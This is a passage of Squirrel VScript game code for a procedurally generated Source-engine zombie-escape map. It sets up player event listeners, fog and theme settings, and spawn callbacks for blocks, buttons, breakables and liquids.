	EntFireByHandle(self,"RunScriptCode"," SpawnZombieItemsInSpawn(); ",1.60,null,null);
	EntFireByHandle(self,"RunScriptCode"," ItemFallCleanup(); ",::ITEMFALL_CLEANUP_RATE,null,null);
	EntFireByHandle(self,"RunScriptCode"," PlayMusic(); ",0.50,null,null);
	EntFireByHandle(self,"RunScriptCode","TickFalldownCheckpoint();",2.00,null,null);
	EntFire("manager","RunScriptCode"," ::ITEMS.flight.SetupEventListener(); ",4.00,null);
	//if(::JUMP_VELOCITY!=null)//nah gotta create the eventlistener no matter what
		::EventListener("player_jump",{function EventFired(name,data){
				if(::JUMP_VELOCITY==null)return;
				local pc = ::GetPlayerClass(data.userid);
				if(pc==null)return;
				if(pc.handle==null||!pc.handle.IsValid())return;
				if(::JUMP_VELOCITY_CTONLY && pc.handle.GetTeam()!=3)return;
				pc.handle.ValidateScriptScope();
				if("moonboosting" in pc.handle.GetScriptScope())return;
				
				
				//if(::JUMP_VELOCITY_CROUCHO && ::GetDistance(pc.handle.EyePosition(),pc.handle.GetOrigin()) > 52)return;		//__CSS__ og
				if(::JUMP_VELOCITY_CROUCHO && !::IsKeyPressed(pc.handle,"CTRL"))return;			//__CSS__ new
				
				
				if(::JUMP_VELOCITY_DELAY<=0.00)
				{
					local vel = pc.handle.GetVelocity();
					vel.z = (0.00+::JUMP_VELOCITY);
					pc.handle.SetVelocity(vel);
				}
				else
					EntFireByHandle(pc.handle,"RunScriptCode",
					"local vel=self.GetVelocity();vel.z=(0.00+::JUMP_VELOCITY);self.SetVelocity(vel);",
					::JUMP_VELOCITY_DELAY,null,null);
			}});
	::EventListener("player_death",{function EventFired(name,data){
		local pc = ::GetPlayerClass(data.userid);
		if(pc==null)return;
		if(pc.handle==null||!pc.handle.IsValid())return;
		local valid_stage_death = false;
		if(pc.handle.GetTeam()==3)valid_stage_death = true;			//victim is human - valid death!
		else
		{
			if(data.attacker == 0)return;							//world killed T
			local pca = ::GetPlayerClass(data.attacker);			//check if attacker is zombie
			if(pca==null)return;
			if(pca.handle==null||!pca.handle.IsValid())return;
			if(pca.handle.GetTeam()==2)valid_stage_death = true;	//attacker is zombie - human must have been infected - valid death!
		}
		if(!valid_stage_death)return;
		local midx = (0+::manager.GetScriptScope().mapspawnindex);
		local midx_min = (0+::manager.GetScriptScope().mapspawnindex+(-(::manager.GetScriptScope().MAX_AREA_HISTORY+2)));
		if(midx_min<0)midx_min=0;
		local pos_p = pc.handle.GetOrigin();
		pos_p.z = 0;
		local closest_index = null;
		local closest_distance = 999999.00;
		for(midx;midx>midx_min;midx--)
		{
			local pos_s = Vector()+::MAPDATA[midx].center_pos;
			pos_s.z = 0;
			local dist = ::GetDistance(pos_p,pos_s);
			if(dist < closest_distance)
			{
				closest_distance = (0.00+dist);
				closest_index = (0+midx);
			}
		}
		if(closest_index!=null)::MAPDATA[closest_index].deaths++;
	}});
	theme_changevar_target = RandomInt(::infinite_mode_newthemerand_min,::infinite_mode_newthemerand_max);
	if(::stage >= ::STAGES.len())
	{
		if(::stage == ::STAGES.len())
		{
			::finale_started = true;
			EntFire("manager","RunScriptCode"," StartFinale(); ",0.10,null);
			foreach(i,t in ::THEMES){randomtheme_buffer.push(i);}
			TickRandomTheme();
			TickRandomThemeSH();
		}
		else
		{
			local stagebuf = [];
			foreach(i,t in ::THEMES){stagebuf.push(i);}
			::THEME = stagebuf[RandomInt(0,stagebuf.len()-1)];
			::DIFFICULTIES[0].Run();
		}
	}
	else
	{
		::THEME = ::STAGES[::stage].theme;
		::DIFFICULTIES[1+::stage].Run();
	}
	::THEMES["silenthill"].hazliquid_damage = 0;
	::THEMES.silenthill.music.clear();
	foreach(m in ::THEMES.silenthill.music_light){::THEMES.silenthill.music.push(m);}
	if(::FORCE_THEME!=null)::THEME = ""+::FORCE_THEME;
	if(::stage == ::STAGES.len())
	{
		SetupFinaleSky();
		EntFire("fog","TurnOn","",0.02,null);
		EntFire("fog","TurnOn","",1.00,null);
		fog_color = Vector()+fog_finale_color;
		fog_color_target = Vector()+fog_finale_color;
		fog_dist_start = 0.00+fog_finale_start;
		fog_dist_start_target = 0.00+fog_finale_start;
		fog_dist_end = 0.00+fog_finale_end;
		fog_dist_end_target = 0.00+fog_finale_end;
		fog_density = 0.00+fog_finale_density;
		fog_density_target = 0.00+fog_finale_density;
		fog_farz = 0.00+fog_finale_farz;
		fog_farz_target = 0.00+fog_finale_farz;
		if(::fog_handle==null||!::fog_handle.IsValid())::fog_handle=Entities.FindByName(null,"fog");
		::fog_handle.__KeyValueFromVector("fogcolor",fog_finale_color);
		::fog_handle.__KeyValueFromInt("fogstart",fog_finale_start);
		::fog_handle.__KeyValueFromInt("fogend",fog_finale_end);
		::fog_handle.__KeyValueFromFloat("fogmaxdensity",fog_finale_density);
		::fog_handle.__KeyValueFromInt("farz",fog_finale_farz);
	}
	else
	{
		::THEMES[::THEME].SkyboxSetup();
		EntFire("fog","TurnOn","",0.02,null);
		EntFire("fog","TurnOn","",1.00,null);
		fog_color = Vector()+::THEMES[::THEME].fog_color;
		fog_color_target = Vector()+::THEMES[::THEME].fog_color;
		fog_dist_start = 0.00+::THEMES[::THEME].fog_start;
		fog_dist_start_target = 0.00+::THEMES[::THEME].fog_start;
		fog_dist_end = 0.00+::THEMES[::THEME].fog_end;
		fog_dist_end_target = 0.00+::THEMES[::THEME].fog_end;
		fog_density = 0.00+::THEMES[::THEME].fog_density;
		fog_density_target = 0.00+::THEMES[::THEME].fog_density;
		fog_farz = 0.00+::THEMES[::THEME].fog_farz;
		fog_farz_target = 0.00+::THEMES[::THEME].fog_farz;
		if(::fog_handle==null||!::fog_handle.IsValid())::fog_handle=Entities.FindByName(null,"fog");
		::fog_handle.__KeyValueFromVector("fogcolor",::THEMES[::THEME].fog_color);
		::fog_handle.__KeyValueFromInt("fogstart",::THEMES[::THEME].fog_start);
		::fog_handle.__KeyValueFromInt("fogend",::THEMES[::THEME].fog_end);
		::fog_handle.__KeyValueFromFloat("fogmaxdensity",::THEMES[::THEME].fog_density);
		::fog_handle.__KeyValueFromInt("farz",::THEMES[::THEME].fog_farz);
	}
	local randstart = [		{	p=Vector(512,0,0),		pdir=Vector(1,0,0),			dir="east",		rot=Vector(0,0,0)		},
							{	p=Vector(-512,0,0),		pdir=Vector(-1,0,0),		dir="west",		rot=Vector(0,180,0)		},
							{	p=Vector(0,512,0),		pdir=Vector(0,1,0),			dir="north",	rot=Vector(0,90,0)		},
							{	p=Vector(0,-512,0),		pdir=Vector(0,-1,0),		dir="south",	rot=Vector(0,270,0)		}];
		local randstart_pick = randstart[RandomInt(0,randstart.len()-1)];
			pos = randstart_pick.p;
			posdir = randstart_pick.pdir;
			::spawnarea_direction = Vector()+posdir;
			patrondir = Vector()+posdir;
			current_dir = randstart_pick.dir;
			
			
			//__CSS__ new - ensure that players are faced correctly at roundstart
			
			for(local h;h=Entities.FindByClassname(h,"player");)
			{
				try{
					h.SetForwardVector(::spawnarea_direction);
				}catch(e){}
			}
			
			
	try{
		local sb = Entities.FindByName(null,"spawninfoboard");
		sb.SetOrigin(Vector(0,0,472)-(randstart_pick.pdir * 516));
		sb.SetAngles(15,randstart_pick.rot.y,0);
	}catch(e){printl("[Start() spawninfoboard posrot error]: "+e);}
	EntFireByHandle(self,"RunScriptCode"," PatronSetup(); ",0.20,null,null);
	EntFire("env_cascade_light","AddOutput","maxshadowdistance "+::SHADOW_DIST.tostring(),0.00,null);
	EntFire("server","Command","sv_airaccelerate "+::THEMES[::THEME].airaccelerate.tostring(),0.00,null);
	EntFire("server","Command","mp_roundtime "+::roundtime.tostring(),0.00,null);
	EntFire("server","Command","mp_freezetime "+::freezetime.tostring(),0.00,null);
	EntFire("tele_spawninit","Enable","",0.10,null);
	if(DEBUG_TPDEST)EntFire("manager","RunScriptCode"," DebugTPdestTick(); ",1.00,null);
	maker = Entities.FindByName(null,"template_block_maker");
	local template = Entities.FindByName(null,"template_block");
	template.ValidateScriptScope();
	template.GetScriptScope().PreSpawnInstance <- function(entityClass,entityName)
	{
		if(entityClass == "trigger_multiple")return;
		if(::SpawnQueue.len()<=0){printl("ERROR[template_block ::SpawnQueue empty!]");return;}
		local c = ::SpawnQueue[0];
		//self.PrecacheModel(c.modelname);
		local spawnflags = 0;			//__CSS__ <og was 10,  now 0 - no more physics
		//local nosolid = false;	//__CSS__ prop_door_rotating
		local targetname = "block_"+c.spawnindex;
		if("targetname" in c)targetname = c.targetname;
		if(("breakable" in c) && c.breakable)targetname = targetname+"_breakable";
		if(::TYPES[c.index].name=="TRAPFLOOR" || "trapfloor" in c)
		{
			if(!::DISABLE_TRAPFLOORS && RandomFloat(0.00,100.00)<=::THEMES[::THEME].trapfloor_chance)
			{
				//spawnflags += 16;			//spawnflags += 16: break on touch
				c.trapfloorflags <- true;
				c.crackbody = true;
			}
			else c.crackbody = false;
		}
		if(		::TYPES[c.index].name.find("LIQUID_FALL")==0||
				::TYPES[c.index].name.find("HAZLIQUID_FALL")==0||
				::TYPES[c.index].name.find("TELEPORT")==0||
				::TYPES[c.index].name=="LADDER"||
				::TYPES[c.index].name=="LOWGRAV"||
				::TYPES[c.index].name=="LOWGRAV_FLOOR"||
				::TYPES[c.index].name=="AIRSLIDE")
			{
				spawnflags += 4;			//spawnflags += 4: debris (don't collide with players or other debris)
				//nosolid = true;	//__CSS__ prop_door_rotating
			}
			
		//if("epress" in c && c.epress != 0)
		//	spawnflags += 256;			//spawnflags += 256: Generate output on +use		//__CSS__ this will be set on buttons and doors separately - no more physics
		if("holdnameaffix" in c)
			targetname = targetname+c.holdnameaffix;
		if(::DEBUG_COLOR && c.index!=9999 || "isgeneric" in c && c.index!=9999 || !::finale_started && ::THEME=="generic" && c.index!=9999)
		{
			c.color = ::TYPES[c.index].color;
			if(::TYPES[c.index].name=="WALL")
				c.color = Vector(100,100,150);
			else if(::TYPES[c.index].name.find("HIDDEN")!=null)
				c.color = Vector(255,255,255);
		}
		local keyvalues =
		{
			rendercolor = c.color.x.tostring()+" "+c.color.y.tostring()+" "+c.color.z.tostring(),
			targetname = targetname,
			model = c.modelname.tostring(),
			
			spawnflags = spawnflags.tostring(),		//__CSS__ prop_door_rotating (<og)
			//spawnflags = 55296,								//__CSS__ prop_door_rotating
			
			rendermode = 0,		//__CSS__ hotfix
			DisableShadows = 1,	//__CSS__ hotfix
			
		};
		
		if("do_lighting" in c)keyvalues.lightingorigin <- "";		//__CSS__ boss_plat_lighting
		
		//if(nosolid){	keyvalues.solid <- 0;				//__CSS__ prop_door_rotating
		//				keyvalues.collisiongroup <- 10;}	//__CSS__ prop_door_rotating
		return keyvalues;
	}
	template.GetScriptScope().PostSpawn <- function(entities)
	{
		foreach(targetname,handle in entities)
		{
			if(::SpawnQueue.len() <= 0)continue;	//__CSS__ why is this empty here? that can't be good, threading shit?
			local c = ::SpawnQueue[0];
			if(handle.GetClassname()=="trigger_multiple")
			{
				if("crackbody" in c && c.crackbody == true){}
				else
				{
					EntFireByHandle(handle,"Disable","",0.00,null,null);
					EntFireByHandle(handle,"Enable","",0.01,null,null);
					EntFireByHandle(handle,"Enable","",0.03,null,null);
				}
				EntFireByHandle(handle,"Kill","",::touchbspawnsafe_time,null,null);
				continue;
			}
			::SpawnQueue.remove(0);
			if(::NO_CSM)EntFireByHandle(handle,"AddOutput","effects 16384",0.00,null,null);
			local rendermode = ""+::BLOCK_RENDERMODE.tostring();
			local skin = 0;
			local body = 0;
			if("angleslope" in c)
			{
				if(c.angleslope)
				{
					handle.SetAngles(10,handle.GetAngles().y,handle.GetAngles().z);		//hardcode the slope flat like this
					handle.SetOrigin(handle.GetOrigin()+Vector(0,0,14));
				}
			}
			if("trapfloorflags" in c)EntFireByHandle(handle,"AddOutput","spawnflags 24",::TRAPFLOOR_SFLAGS_DELAY,null,null);
			if("crackbody" in c && c.crackbody == true)body = 1;
			if(::TYPES[c.index].name.find("TELEPORTDEST")==0)body = 1;
			else if(::TYPES[c.index].name=="LOWGRAV"||::TYPES[c.index].name=="LOWGRAV_FLOOR")skin = (0+::THEMES[::THEME].lowgrav_skin);
			else if(::TYPES[c.index].name=="AIRSLIDE")skin = (0+::THEMES[::THEME].airslide_skin);
			
			if(		::TYPES[c.index].name.find("LIQUID_FALL")==0||
					::TYPES[c.index].name.find("HAZLIQUID_FALL")==0||
					::TYPES[c.index].name.find("TELEPORT")==0||
					::TYPES[c.index].name=="LADDER"||
					::TYPES[c.index].name=="LOWGRAV"||
					::TYPES[c.index].name=="LOWGRAV_FLOOR"||
					::TYPES[c.index].name=="AIRSLIDE")
					{
						EntFireByHandle(handle,"RunScriptCode","self.SetSolid(5);",0.00,null,null);		//seems to work, staying non-collidable by shit (bullets/etc)
																							//collisiongroup 10 seems to fuck with lowgrav trigger...
						rendermode = "9";
					}
			else if(::TYPES[c.index].name.find("HIDDEN")!=null || ::FORCE_RENDERMODE9)
				rendermode = "9";
			if("breakable" in c && c.breakable == true)
			{
				handle.ValidateScriptScope();
				local health = (0.00+::THEMES[::THEME].breakable_health);
				health *= ::GetPlayerCount();
				health = health.tointeger();
				health += ::BREAKABLE_HEALTH_BASE;
				if(health < 1)health = 1;
				handle.GetScriptScope().health <- (0+health);
				handle.GetScriptScope().retcol <- "255 255 255";
				handle.GetScriptScope().color_cd <- false;
				handle.GetScriptScope().Damaged <- function()
				{
					health--;
					if(health<=0)
					{
						EntFireByHandle(self,"Kill","",0.00,null,null);
						local sangs = [0,90,180,270];										//NEW in v1_7 - spawn breakable animated prop
						//::manager.PrecacheModel("models/luffaren/breakable_gibs.mdl");
						::Ent(self.GetOrigin(),Vector(0,sangs[RandomInt(0,sangs.len()-1)],0),"prop_dynamic",{
								model = "models/luffaren/breakable_gibs.mdl",
								rendermode = 1,
								rendercolor = "30 30 30",
								glowenabled = 1,
								glowdist = 10000,
								glowstyle = 1,
								glowcolor = "30 10 00",
							},{function Run(){
								EntFireByHandle(self,"SetAnimation","break",0.00,null,null);
								//EntFireByHandle(self,"fadeandkill","1",1.00,null,null);
								::FadeAndKill(self,1.00,1.00);		//__CSS__ fadeandkill doesn't exist in css
								EntFireByHandle(self,"Kill","",1.98,null,null);
								EntFireByHandle(self,"RunScriptCode","self.__KeyValueFromFloat(\"playbackrate\",RandomFloat(0.70,0.90));",0.02,null,null);
							}});
						if(::breakable_fxamt>::BREAKABLE_FXLIMIT){}else{::breakable_fxamt++;EntFire("manager","RunScriptCode","::breakable_fxamt--;",::BREAKABLE_FX_CD,null);
							::Sound("physics/concrete/concrete_break2.wav",self.GetOrigin()+Vector(0,0,50),null,5000,0.20,RandomInt(60,70),10);}
					}
					else
					{
						if(color_cd)return;
						color_cd=true;
						EntFireByHandle(self,"RunScriptCode"," color_cd=false; ",0.15,null,null);		//0.06 in v1
						EntFireByHandle(self,"AddOutput","rendercolor 255 100 100",0.00,null,null);		//"255 0 0" in v1
						EntFireByHandle(self,"AddOutput","rendercolor "+retcol,0.05,null,null);
						if(::breakable_fxamt>::BREAKABLE_FXLIMIT){}else{::breakable_fxamt++;EntFire("manager","RunScriptCode","::breakable_fxamt--;",::BREAKABLE_FX_CD,null);
							::Sound("physics/concrete/concrete_break2.wav",self.GetOrigin()+Vector(0,0,50),null,5000,0.05,RandomInt(120,130),10);}
					}
				}
				EntFireByHandle(handle,"AddOutput","OnTakeDamage !self:RunScriptCode:Damaged();:0:-1",0.05,null,null);
				if(::THEME=="generic")handle.GetScriptScope().retcol = ""+::TYPES[91].color.x+" "+::TYPES[91].color.y+" "+::TYPES[91].color.z;
			}
			if("epress" in c && c.epress != 0)
			{
				
				
				handle = ::ConvertProp(handle,"prop_physics_override",266,true);			//__CSS__ no more physics
				handle.ValidateScriptScope();
				handle.GetScriptScope().pressed <- false;
				handle.GetScriptScope().presstype <- (0+c.epress);
				handle.GetScriptScope().mspawnindex <- (0+c.spawnindex);
				handle.GetScriptScope().is_buttonmodel <- true;
				
				
				
				if(handle.GetScriptScope().presstype==1)
				{
					handle.GetScriptScope().is_generic_hold <- true;
					handle.SetSize(Vector(-48,-48,0),Vector(48,48,150));
					handle.SetSolid(2);
				}
				if(handle.GetScriptScope().presstype==2)
					handle.__KeyValueFromString("targetname","block_"+(0+c.spawnindex).tostring()+"_endbutton");
				else
					handle.__KeyValueFromString("targetname","block_"+(0+c.spawnindex).tostring()+"_button");
				handle.GetScriptScope().Press <- function(destroyed=false)
				{
					if(pressed)return;
					pressed = true;
					
					if(presstype == 1)			//1:generichold
					{
						if(mspawnindex==::manager.GetScriptScope().mapspawnindex)::delay_timer = 0.00;
						local opentime = ::THEMES[::THEME].generichold_opentime;
						if(opentime <= 0.00)opentime = 0.00;
						else ::ServerSay("say ***HOLD OPENS IN "+opentime.tostring()+" SECONDS***",0.00,null);
						::ServerSay("say ***OPENING HOLD***",opentime,null);
						EntFireByHandle(self,"FireUser2","",0.00,null,null);		//this can only run once per group ('pressed' gets true'd for the entire group when FireUser2 runs)
						EntFireByHandle(self,"FireUser1","",opentime,null,null);
					}
					else if(presstype == 2)		//2:endbutton
					{
						if(mspawnindex==::manager.GetScriptScope().mapspawnindex)::delay_timer = 0.00;
						EntFireByHandle(self,"Kill","",0.00,null,null);
						::MAPDATA[mspawnindex].buttoncount_end--;
						if(::MAPDATA[mspawnindex].buttoncount_end>0)return;
						local opentime = ::THEMES[::THEME].endbutton_time;
						local info = "PRESSED";
						if(destroyed)info = "DESTROYED";
						if(opentime <= 0.00)
						{
							opentime = 0.00;
							if(!::manager.GetScriptScope().disable_generatenextmap)
								::ServerSay("say ***END BUTTON "+info+" - GENERATING NEXT MAP***",0.00,null);
						}
						else if(!::manager.GetScriptScope().disable_generatenextmap)
						{
							::ServerSay("say ***END BUTTON "+info+" - GENERATING NEXT MAP IN "+opentime.tostring()+" SECONDS***",0.00,null);
							::ServerSay("say ***GENERATING NEXT MAP***",opentime,null);
						}
						if(::NEXTMAPGEN_TIME_OVERRIDE != null)opentime = (0.00+::NEXTMAPGEN_TIME_OVERRIDE);
						EntFire("manager","RunScriptCode"," GenerateNextMap(); ",opentime,null);
						local eic = ::ENDINDICATOR_TRIGGERED.x.tostring()+" "+::ENDINDICATOR_TRIGGERED.y.tostring()+" "+::ENDINDICATOR_TRIGGERED.z.tostring();
						local eico = ::ENDINDICATOR_OLD.x.tostring()+" "+::ENDINDICATOR_OLD.y.tostring()+" "+::ENDINDICATOR_OLD.z.tostring();
						try{local bei=Entities.FindByName(null,"block_"+mapspawnindex.tostring()+"_endindicator");
						bei.ValidateScriptScope();bei.GetScriptScope().endtriggered<-true;}catch(e){}
						EntFire("block_"+::manager.GetScriptScope().mapspawnindex.tostring()+"_endindicator","AddOutput","rendercolor "+eic,0.00,null);
						EntFire("block_"+::manager.GetScriptScope().mapspawnindex.tostring()+"_endindicator","AddOutput","skin 1",0.00,null);
						EntFire("block_"+::manager.GetScriptScope().mapspawnindex.tostring()+"_endindicator","AddOutput","glowenabled 1",0.00,null);
						EntFire("block_"+(::manager.GetScriptScope().mapspawnindex-1).tostring()+"_endindicator","AddOutput","skin 0",0.00,null);
						EntFire("block_"+(::manager.GetScriptScope().mapspawnindex-1).tostring()+"_endindicator","AddOutput","glowenabled 0",0.00,null);
						EntFire("block_"+(::manager.GetScriptScope().mapspawnindex-1).tostring()+"_endindicator","AddOutput","rendercolor "+eico,0.00,null);
					}
					else						//presstype 3,4,5,6 = button 1,2,3,4
					{
						if(mspawnindex==::manager.GetScriptScope().mapspawnindex)::delay_timer = 0.00;
						EntFireByHandle(self,"Kill","",0.00,null,null);
						if(presstype==3){::MAPDATA[mspawnindex].buttoncount_1--;if(::MAPDATA[mspawnindex].buttoncount_1>0)return;}
						else if(presstype==4){::MAPDATA[mspawnindex].buttoncount_2--;if(::MAPDATA[mspawnindex].buttoncount_2>0)return;}
						else if(presstype==5){::MAPDATA[mspawnindex].buttoncount_3--;if(::MAPDATA[mspawnindex].buttoncount_3>0)return;}
						else if(presstype==6){::MAPDATA[mspawnindex].buttoncount_4--;if(::MAPDATA[mspawnindex].buttoncount_4>0)return;}
						local opentime = ::THEMES[::THEME].hold_opentime;
						if(opentime <= 0.00)opentime = 0.00;
						else ::ServerSay("say ***HOLD OPENS IN "+opentime.tostring()+" SECONDS***",0.00,null);
						::ServerSay("say ***OPENING HOLD***",opentime,null);
						EntFire("block_"+mspawnindex.tostring()+"_hold_"+(presstype-2).tostring(),"FireUser1","",opentime,null);
					}
					
					//__CSS__ css4_item_press_filter
					//css5 - moved this to the door-opening logic
					//if(presstype == 1)			//1:generichold
					//{
					//	self.AcceptInput("AddOutput","spawnflags 10",null,null);
					//	::RecurseDoorPressed(self);
					//}
				}
				EntFireByHandle(handle,"AddOutput","OnPlayerUse !self:RunScriptCode:Press();:0:-1",0.05,null,null);
			}
			if(::SPAWNFADE_FX)
			{
				EntFireByHandle(handle,"AddOutput","rendermode 9",0.00,null,null);
				EntFireByHandle(handle,"AddOutput","renderamt 0",0.00,null,null);
				local ii = 0.00;
				for(local alpha=0;alpha<255;alpha+=::SPAWNFADE_ALPHA_ADD){
					EntFireByHandle(handle,"AddOutput","renderamt "+alpha.tostring(),ii,null,null);
					ii += ::SPAWNFADE_ALPHA_TADD;}
				EntFireByHandle(handle,"AddOutput","renderamt 255",ii,null,null);
				EntFireByHandle(handle,"AddOutput","rendermode "+rendermode,ii,null,null);
			}
			else
				EntFireByHandle(handle,"AddOutput","rendermode "+rendermode,0.00,null,null);
			if(::TYPES[c.index].name=="START_END")
			{
				handle.ValidateScriptScope();
				handle.GetScriptScope().startendtile <- true;
			}
			else if(::TYPES[c.index].name.find("ELEVATOR")==0)
			{
				if(::movelinear_spawnqueue.len()>0)
				{
					foreach(mlc in ::movelinear_spawnqueue)
					{
						if(mlc.child_handled)continue;
						mlc.child_handled = true;
						mlc.child = handle;
						::movelinear_maker.SpawnEntityAtLocation(mlc.position,Vector());
						break;
					}
				}
			}
			else if(::TYPES[c.index].name=="GENERICHOLD" || ::TYPES[c.index].name.find("HOLD")==0)
			{
				if(::movelinear_spawnqueue.len()>0)
				{
					local mapspawnindex = Entities.FindByName(null,"manager").GetScriptScope().mapspawnindex;
					foreach(mlc in ::movelinear_spawnqueue)
					{
						if(mlc.child_handled)continue;
						mlc.child_handled = true;
						mlc.child = handle;
						mlc.ishold <- true;
						if(::TYPES[c.index].name=="GENERICHOLD")
							mlc.isgenerichold <- true;
						else{			//__CSS__ no more physics
							mlc.child.SetSize(Vector(-48,-48,0),Vector(48,48,150));		//146 floorsafe
							mlc.child.SetSolid(2);
							
							//printl("------------------")
							//foreach(k,v in mlc)printl("   "+k+" : "+v);
							
						}
						mlc.holdnameindex <- (0+mapspawnindex);
						::movelinear_maker.SpawnEntityAtLocation(mlc.position,Vector());
						if(mlc.inverted)
						{
							mlc.child.SetOrigin(mlc.child.GetOrigin()+Vector(0,0,-148));
							
							
							//__CSS__ no more physics
							mlc.child.ValidateScriptScope()
							mlc.child.GetScriptScope().is_inverted <- true;
							mlc.child.SetSize(Vector(-48,-48,0),Vector(48,48,146));
							mlc.child.SetSolid(2);
						}
						break;
					}
				}
			}
			else if(::TYPES[c.index].name.find("LIQUID")==0||::TYPES[c.index].name.find("HAZLIQUID")==0)
			{
				EntFireByHandle(handle,"AddOutput","rendercolor 255 255 255",0.00,null,null);
				body = 31;
				skin = ::THEMES[::THEME].liquid_skin;
				if(::TYPES[c.index].name.find("HAZLIQUID")==0)
				{
					skin = ::THEMES[::THEME].hazliquid_skin;
				}
				if(::TYPES[c.index].name.find("LIQUID_FALL")==0||::TYPES[c.index].name.find("HAZLIQUID_FALL")==0)
				{
					skin++;
				}
				else if(::TYPES[c.index].name.find("LIQUID_STREAM")==0||::TYPES[c.index].name.find("HAZLIQUID_STREAM")==0)
				{
					skin++;
					body = 46;
					if(::TYPES[c.index].name=="LIQUID_STREAM" || ::TYPES[c.index].name=="HAZLIQUID_STREAM")body = 47;
					else if(::TYPES[c.index].name.find("SHALLOW")!=null)//shallow stream
					{
						body = 1;	//cover only top
						body = 31;	//cover all sides
						if(::TYPES[c.index].name=="LIQUID_STREAM_SHALLOW" || ::TYPES[c.index].name=="HAZLIQUID_STREAM_SHALLOW")	//drown shallow (jump)
						{
							body = 47;
							EntFireByHandle(handle,"AddOutput","rendermode 3",0.00,null,null);
							if(::TYPES[c.index].name=="HAZLIQUID_STREAM_SHALLOW")
							{
								EntFireByHandle(handle,"AddOutput","rendercolor 150 0 0",0.00,null,null);
								skin = 12;
							}
							else
							{
								EntFireByHandle(handle,"AddOutput","rendercolor 0 255 0",0.00,null,null);
								skin = 4;
							}
						}
					}
				}
				else if(::TYPES[c.index].name=="LIQUID_SHALLOW"||::TYPES[c.index].name=="HAZLIQUID_SHALLOW")
				{
					body = 1;	//cover only top
					body = 31;	//cover all sides
				}
			}
			if(::ENDBUTCOL!=null && ::TYPES[c.index].name=="ENDBUTTON")
			{
				local colset = "rendercolor "+::ENDBUTCOL.x.tostring()+" "+::ENDBUTCOL.y.tostring()+" "+::ENDBUTCOL.z.tostring();
				EntFireByHandle(handle,"AddOutput",colset,0.00,null,null);
				EntFireByHandle(handle,"AddOutput",colset,0.10,null,null);
			}
			EntFireByHandle(handle,"AddOutput","body "+body.tostring(),0.00,null,null);
			EntFireByHandle(handle,"AddOutput","skin "+skin.tostring(),0.00,null,null);
		}
	}
	::model_maker = Entities.FindByName(null,"template_model_maker");
	template = Entities.FindByName(null,"template_model");
	template.ValidateScriptScope();
	template.GetScriptScope().PreSpawnInstance <- function(entityClass,entityName)
	{
		if(::model_spawnqueue.len()<=0)
			return;
		local q = ::model_spawnqueue[0];
		//self.PrecacheModel(q.model);
		return {model=q.model,targetname=q.targetname,
		DisableShadows = 1,	//__CSS__ hotfix
		}
	}
	template.GetScriptScope().PostSpawn <- function(entities)
	{
		local borked = false;
		local q = null;
		if(::model_spawnqueue.len()<=0)
			borked = true;
		else
		{
			q = ::model_spawnqueue[0];
			::model_spawnqueue.remove(0);
		}
		foreach(targetname,handle in entities)
		{
			if(borked)
			{
				EntFireByHandle(handle,"Kill","",0.00,null,null);
				break;
			}
			if(::NO_CSM)EntFireByHandle(handle,"AddOutput","effects 16384",0.00,null,null);
			
			
			EntFireByHandle(handle,"AddOutput","body 1021",0.00,null,null);		//all faces
			//EntFireByHandle(handle,"AddOutput","body 1",0.00,null,null);		//just top face
			EntFireByHandle(handle,"AddOutput","skin 1",0.00,null,null);
			EntFireByHandle(handle,"AddOutput","rendermode 2",0.00,null,null);
			EntFireByHandle(handle,"AddOutput","rendercolor 150 200 255 50",0.00,null,null);
			

			if(q.type == "LIQUID" || q.type == "HAZLIQUID"){}
			else if(q.type == "LIQUID_SHALLOW" || q.type == "HAZLIQUID_SHALLOW")
			{
				EntFireByHandle(handle,"AddOutput","rendercolor 170 230 255 50",0.00,null,null);
				EntFireByHandle(handle,"AddOutput","body 1",0.00,null,null);
			}
			else if(q.type.find("LIQUID_STREAM")==0 || q.type.find("HAZLIQUID_STREAM")==0)
			{
				EntFireByHandle(handle,"AddOutput","skin 2",0.00,null,null);
				if(q.type == "LIQUID_STREAM" || q.type == "HAZLIQUID_STREAM")	//drown
					EntFireByHandle(handle,"AddOutput","body 683",0.00,null,null);
				else
					EntFireByHandle(handle,"AddOutput","body 681",0.00,null,null);
			}
			else if(q.type == "LIQUID_FALL" || q.type == "HAZLIQUID_FALL")
			{
				EntFireByHandle(handle,"AddOutput","body 2",0.00,null,null);
				EntFireByHandle(handle,"AddOutput","skin 2",0.00,null,null);
			}
			else if(q.type.find("LIQUID_TUNNEL")==0 || q.type.find("HAZLIQUID_TUNNEL")==0){}
			break;
		}
	}
	::liquid_maker = Entities.FindByName(null,"template_liquid_maker");
	template = Entities.FindByName(null,"template_liquid");
	template.ValidateScriptScope();
	template.GetScriptScope().PreSpawnInstance <- function(entityClass,entityName){}
	template.GetScriptScope().PostSpawn <- function(entities)
	{
		local liquid = null;
		local borked = false;
		local q = null;
		if(::liquid_spawnqueue.len()<=0)borked = true;
		else
		{
			q = ::liquid_spawnqueue[0];
			::liquid_spawnqueue.remove(0);
		}
		foreach(targetname,handle in entities)
		{
			if(borked)
			{
				EntFireByHandle(handle,"Kill","",0.00,null,null);
				continue;
			}
			liquid = handle;
			handle.ValidateScriptScope();
			handle.GetScriptScope().tries <- 10;
			handle.GetScriptScope().RunParentSet <- function()
			{
				tries--;
				if(tries <= 0)return;
					//DebugDrawBoxAngles(self.GetOrigin(),Vector(-4,-4,-4),Vector(4,4,4),Vector(),0,0,255,100,1.00);
				//local blockmaster = Entities.FindByClassnameNearest("prop_physics_override",self.GetOrigin(),16);
				local blockmaster = Entities.FindByClassnameNearest("prop_dynamic",self.GetOrigin(),16);		//__CSS__ no more physics
					//printl("-------------BLOCKMASTER> "+blockmaster);
				if(blockmaster==null||!blockmaster.IsValid())
				{
					EntFireByHandle(self,"RunScriptCode"," RunParentSet(); ",1.00,null,null);
					return;
				}
				EntFireByHandle(self,"SetParent","!activator",0.00,blockmaster,null);
				if("isshallowjump" in this)		//this makes the silenthill-theme world-transition ignore this tile
				{
					blockmaster.ValidateScriptScope();
					blockmaster.GetScriptScope().isshallowjump <- true;
				}
					//EntFireByHandle(blockmaster,"AddOutput","rendercolor 255 0 0",0.00,null,null);
					//DebugDrawBoxAngles(blockmaster.GetOrigin(),Vector(-2,-2,-2),Vector(2,2,2),Vector(),255,0,0,100,10.00);
			}
			if(::LIQUID_DOPARENT)EntFireByHandle(handle,"RunScriptCode"," RunParentSet(); ",0.55,null,null);
			if(::NO_CSM)EntFireByHandle(handle,"AddOutput","effects 16384",0.00,null,null);
			handle.__KeyValueFromString("targetname",q.targetname);
			EntFireByHandle(handle,"DisableDraw","",0.00,null,null);
		}
